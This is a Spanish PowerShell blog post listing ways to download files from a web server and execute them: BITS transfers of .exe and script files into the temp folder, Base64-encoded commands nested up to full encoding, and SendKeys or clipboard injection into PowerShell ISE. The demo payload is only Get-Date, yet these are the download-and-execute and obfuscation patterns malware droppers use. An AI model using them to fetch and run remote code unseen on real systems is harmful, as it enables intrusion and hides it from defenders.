# Formas de descargar y ejecutar ficheros desde un servidor en PowerShell
## PowerShell, Security 
### URL: https://www.jesusninoc.com/2016/11/15/formas-de-descargar-y-ejecutar-ficheros-desde-un-servidor-en-powershell/
```PowerShell
#Descargar y ejecutar un fichero .exe
Set-Location $env:TEMP
Start-BitsTransfer -Source 'https://www.jesusninoc.com/app.exe'
.\app.exe

#Descargar y ejecutar un fichero .txt
Set-Location $env:TEMP
Start-BitsTransfer -Source 'https://www.jesusninoc.com/script.txt'
.\script.ps1

#Descargar y ejecutar un fichero .ps1
Set-Location $env:TEMP
Start-BitsTransfer -Source 'https://www.jesusninoc.com/script.ps1'
.\script.ps1

#Descargar un fichero .txt, renombrar a .ps1 y ejecutar
Start-BitsTransfer -Source 'https://www.jesusninoc.com/wp-content/uploads/2014/12/config.txt' -Destination $env:TEMP\config.ps1
powershell -File $env:TEMP\config.ps1

#Descargar y ejecutar un fichero .txt con cmdlets
Start-BitsTransfer -Source 'https://www.jesusninoc.com/wp-content/uploads/2014/12/config.txt'
powershell (Get-Content $env:TEMP\config.txt)

#Ejecutar código en Base64
$command="Get-Date"
$code=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
powershell -encodedcommand $code

#Descargar un fichero mediante un cmdlet en Base64
$command="Start-BitsTransfer -Source 'https://www.jesusninoc.com/wp-content/uploads/2014/12/config.txt' -Destination $env:TEMP\config2.txt"
$code=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
powershell -encodedcommand $code
Get-Content $env:TEMP\config2.txt

#Descargar un fichero mediante un cmdlet en Base64 y ejecutar el contenido del fichero
$command="Start-BitsTransfer -Source 'https://www.jesusninoc.com/wp-content/uploads/2014/12/config.txt' -Destination $env:TEMP\config2.txt"
$code=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
powershell -encodedcommand $code
powershell (Get-Content $env:TEMP\config2.txt)

#Ejecutar un cmdlet en Base64
$command="Get-Date"
$code=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
powershell -encodedcommand $code

#Ejecutar un fichero cuyo contenido está en Base64
#$command="Get-Date"
$code="RwBlAHQALQBEAGEAdABlAA=="
powershell -encodedcommand $code

#Descargar un fichero mediante un cmdlet en Base64 y ejecutar el contenido del fichero cuyo contenido está en Base64
$command="Start-BitsTransfer -Source 'https://www.jesusninoc.com/wp-content/uploads/2014/12/config.txt' -Destination $env:TEMP\config2.txt"
$code=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
powershell -encodedcommand $code
$code2=Get-Content $env:TEMP\config2.txt
powershell -encodedcommand $code2

#Descargar un fichero mediante un cmdlet en Base64 y ejecutar el contenido del fichero cuyo contenido está en Base64 (versión optimizada)
$command="Start-BitsTransfer -Source 'https://www.jesusninoc.com/wp-content/uploads/2014/12/config.txt' -Destination $env:TEMP\config2.txt"
$code=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
powershell -encodedcommand $code
#Contenido del fichero config2.txt
#$command="Get-Date"
#$code="RwBlAHQALQBEAGEAdABlAA=="
powershell -encodedcommand (Get-Content $env:TEMP\config2.txt)

#Descargar un fichero mediante un cmdlet en Base64 y ejecutar el contenido del fichero cuyo contenido está en Base64 (versión optimizada y en una línea)
$command="Start-BitsTransfer -Source https://www.jesusninoc.com/wp-content/uploads/2014/12/config.txt -Destination $env:TEMP\config2.txt";$code=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command));powershell -encodedcommand $code;powershell -encodedcommand (Get-Content $env:TEMP\config2.txt)

#Descargar un fichero mediante un cmdlet en Base64 y ejecutar el contenido del fichero cuyo contenido está en Base64 (realizar todas las operaciones en Base64)
$codefor64='$command="Start-BitsTransfer -Source https://www.jesusninoc.com/wp-content/uploads/2014/12/config.txt -Destination $env:TEMP\config2.txt";$code=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command));powershell -encodedcommand $code;$codefar=Get-Content $env:TEMP\config2.txt;powershell -encodedcommand $codefar'
$codebase64=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($codefor64))
powershell -encodedcommand $codebase64

#Abrir PowerShell ISE y ejecutar un cmdlet
Start-Process powershell_ise
Start-Sleep -Seconds 5
[System.Windows.Forms.SendKeys]::SendWait("Get-Date")
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

#Abrir PowerShell ISE y ejecutar un cmdlet en Base64
Start-Process powershell_ise
Start-Sleep -Seconds 5
[System.Windows.Forms.SendKeys]::SendWait("powershell -encodedcommand RwBlAHQALQBEAGEAdABlAA==")
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

#Abrir PowerShell ISE y ejecutar un cmdlet guardado en un fichero
Start-Process powershell_ise
Start-Sleep -Seconds 5
[System.Windows.Forms.SendKeys]::SendWait('$coman=Get-Content $env:TEMP\config2.txt;powershell $coman')
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

#Abrir PowerShell ISE y ejecutar un cmdlet copiado en el Portapapeles
Start-Process powershell_ise
Start-Sleep -Seconds 5
$copy='$coman=Get-Content $env:TEMP\config2.txt;powershell $coman'
Set-Clipboard $copy
[System.Windows.Forms.SendKeys]::SendWait("^(v)")
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

#Abrir PowerShell ISE y ejecutar un cmdlet guardado en un fichero cuyo contenido está en Base64
Start-Process powershell_ise
Start-Sleep -Seconds 5
[System.Windows.Forms.SendKeys]::SendWait('$coman=Get-Content $env:TEMP\config2.txt;powershell -encodedcommand $coman')
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

```
